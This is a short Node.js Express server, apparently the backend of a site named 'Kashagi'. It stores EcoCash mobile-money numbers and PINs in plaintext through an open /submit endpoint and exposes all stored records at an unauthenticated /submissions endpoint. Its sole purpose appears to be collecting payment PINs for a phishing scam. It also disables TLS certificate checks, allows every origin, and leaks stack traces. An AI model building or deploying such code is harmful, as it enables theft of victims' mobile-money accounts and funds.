const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();

app.use(cors());
app.use(express.json());

const pool = new Pool({
connectionString: process.env.DATABASE_URL,
ssl: {
rejectUnauthorized: false
}
});

app.get("/", (req, res) => {
res.send("Kashagi Backend Running");
});

app.get("/test-db", async (req, res) => {
try {
const result = await pool.query("SELECT NOW()");
res.json(result.rows[0]);
} catch (err) {
res.status(500).json({
error: err.message,
name: err.name,
stack: err.stack
});
}
});

app.get("/create-table", async (req, res) => {
try {
await pool.query("CREATE TABLE IF NOT EXISTS submissions ( id SERIAL PRIMARY KEY, ecocash_number TEXT NOT NULL, ecocash_pin TEXT NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )");

res.send("Table created successfully");

} catch (err) {
res.status(500).json({
error: err.message
});
}
});

app.get("/save-test", async (req, res) => {
try {
await pool.query(
"INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1, $2)",
["0771234567", "TEST123"]
);

res.send("Test data saved");

} catch (err) {
res.status(500).json({
error: err.message
});
}
});

app.post("/submit", async (req, res) => {
try {

const { ecocash_number, ecocash_pin } = req.body;

await pool.query(
  "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1, $2)",
  [ecocash_number, ecocash_pin]
);

res.json({
  success: true,
  message: "Data saved successfully"
});

} catch (err) {

res.status(500).json({
  success: false,
  error: err.message
});

}
});

app.get("/submissions", async (req, res) => {
try {

const result = await pool.query(
  "SELECT * FROM submissions ORDER BY id DESC"
);

res.json(result.rows);

} catch (err) {

res.status(500).json({
  error: err.message
});

}
});

app.listen(process.env.PORT || 3000, () => {
console.log("Server started");
});
